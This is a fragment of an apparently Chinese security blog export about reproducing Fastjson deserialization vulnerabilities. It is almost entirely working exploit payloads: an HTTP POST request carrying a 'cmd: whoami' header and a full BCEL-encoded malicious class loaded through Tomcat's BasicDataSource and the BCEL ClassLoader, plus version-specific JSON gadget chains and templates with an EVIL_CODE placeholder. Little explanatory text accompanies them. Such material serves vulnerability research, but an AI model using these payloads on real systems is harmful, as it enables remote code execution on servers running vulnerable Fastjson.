$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A&#125;&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"1-2-33-lt-x3D-fastjson-lt-x3D-1-2-47\"><a href=\"#1-2-33-lt-x3D-fastjson-lt-x3D-1-2-47\" class=\"headerlink\" title=\"1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47\"></a>1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /json HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">9092</span></span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">cmd: whoami</span><br><span class=\"line\">Content-Length: <span class=\"number\">3647</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;xx&quot;</span>:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;x&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;name&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;c&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassName&quot;</span>:<span class=\"string\">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; : <span class=\"string\">&quot;xxx&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"1-2-33-lt-x3D-fastjson-lt-x3D-12-36\"><a href=\"#1-2-33-lt-x3D-fastjson-lt-x3D-12-36\" class=\"headerlink\" title=\"1.2.33&lt;&#x3D;fastjson&lt;&#x3D;12.36\"></a>1.2.33&lt;&#x3D;fastjson&lt;&#x3D;12.36</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;name&quot;</span>:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;x&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;name&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;c&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassName&quot;</span>:<span class=\"string\">&quot;$$BCEL...&quot;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; : <span class=\"string\">&quot;ddd&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-2-37-lt-x3D-fastjson-lt-x3D-1-2-47\"><a href=\"#1-2-37-lt-x3D-fastjson-lt-x3D-1-2-47\" class=\"headerlink\" title=\"1.2.37&lt;&#x3D;fastjson&lt;&#x3D;1.2.47\"></a>1.2.37&lt;&#x3D;fastjson&lt;&#x3D;1.2.47</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;name&quot;</span>:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;x&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;name&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"string\">&quot;y&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;c&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassName&quot;</span>:<span class=\"string\">&quot;$$BCEL$..&quot;</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">                     <span class=\"string\">&quot;$ref&quot;</span>: <span class=\"string\">&quot;$.x.y.c.connection&quot;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Payload\"><a href=\"#Payload\" class=\"headerlink\" title=\"Payload\"></a>Payload</h2><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload1<span class=\"punctuation\">:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;org.apache.commons.dbcp.BasicDataSource&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;driverClassLoader&quot;</span><span class=\"punctuation\">:</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;driverClassName&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;###EVIL_CODE###&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2<span class=\"punctuation\">:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;c&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;org.apache.commons.dbcp.BasicDataSource&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;driverClassLoader&quot;</span><span class=\"punctuation\">:</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;driverClassName&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;###EVIL_CODE###&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;ddd&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["漏洞复现"],"tags":["漏洞复现","反序列化","Fasjson"]}]